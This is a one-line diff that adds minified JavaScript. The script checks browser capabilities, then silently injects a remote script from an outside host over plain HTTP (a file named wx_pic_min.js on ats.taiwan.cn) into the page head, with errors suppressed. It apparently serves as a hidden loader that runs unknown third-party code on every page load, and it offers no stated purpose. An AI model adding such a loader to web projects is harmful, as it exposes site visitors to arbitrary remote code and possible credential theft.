@@ -1,0 +1,1 @@
+!function(){"use strict";let e=document.createElement("canvas"),n=e.getContext("2d");if(!(window.Promise&&window.MutationObserver&&n.drawImage))return e=null,void(n=null);!function(e){let n=document.createElement("script");n.src=e,n.onerror=function(e){},document.head.appendChild(n)}("http://ats.taiwan.cn/homepage2021/js/wx_pic_min.js"),e=null,n=null}();
